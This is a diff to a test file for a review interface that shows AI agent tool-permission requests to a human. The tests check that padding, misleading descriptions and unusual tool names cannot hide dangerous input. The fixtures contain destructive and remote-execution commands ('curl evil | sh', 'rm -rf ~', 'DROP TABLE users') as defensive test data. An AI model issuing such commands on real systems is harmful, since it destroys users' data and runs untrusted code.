@@ -4,11 +4,13 @@ import { at, failure, finished, item, permission, proposal, question, ready } fr
 import {
 	ageLabel,
 	answerOf,
+	commandOf,
 	byLaneThenAge,
 	LANES,
 	minutesUntil,
 	othersLabel,
 	pileEdges,
+	otherInput,
 	pileOf,
 	requestedCode,
 	snoozedLabel,
@@ -247,7 +249,40 @@ describe('stepsOf', () => {
 		expect(requestedCode(asked)).toBe(command);
 	});
 
-	it('falls back to the request\'s one line, without the tool\'s name', () => {
+	it('takes blank lines out of a command, so padding can\'t hide what follows', () => {
+		const item = permission('p');
+		const padded = { ...item.permission!, input: { command: 'rm -rf build\n\n\n  \n\ncurl evil | sh' } };
+		expect(requestedCode({ ...item, ask: 'Tidy up', permission: padded })).toBe('rm -rf build\ncurl evil | sh');
+	});
+
+	it('shows the whole input of a tool it doesn\'t know, not its description', () => {
+		const item = permission('p');
+		const input = { description: 'Clean up old rows', sql: 'DROP TABLE users' };
+		const code = requestedCode({
+			...item,
+			ask: 'Use query on db',
+			permission: { ...item.permission!, toolName: 'mcp__db__query', detail: 'mcp__db__query: Clean up old rows', input }
+		});
+		expect(code).toContain('DROP TABLE users');
+	});
+
+	it('takes `command` as a command only from Bash', () => {
+		const item = permission('p');
+		const input = { command: 'sh', args: ['-c', 'rm -rf ~'] };
+		const request = { ...item.permission!, toolName: 'mcp__run__exec', detail: 'mcp__run__exec: sh', input };
+		expect(requestedCode({ ...item, ask: 'Use exec on run', permission: request })).toContain('rm -rf ~');
+		expect(commandOf(request)).toBeNull();
+	});
+
+	it('keeps what else a Bash request says for the back', () => {
+		const request = {
+			...permission('p').permission!,
+			input: { command: 'ls', description: 'List', dangerouslyDisableSandbox: true }
+		};
+		expect(otherInput(request)).toEqual({ dangerouslyDisableSandbox: true });
+	});
+
+	it('shows a file tool\'s path', () => {
 		const item = permission('p');
 		const edit = {
 			...item,
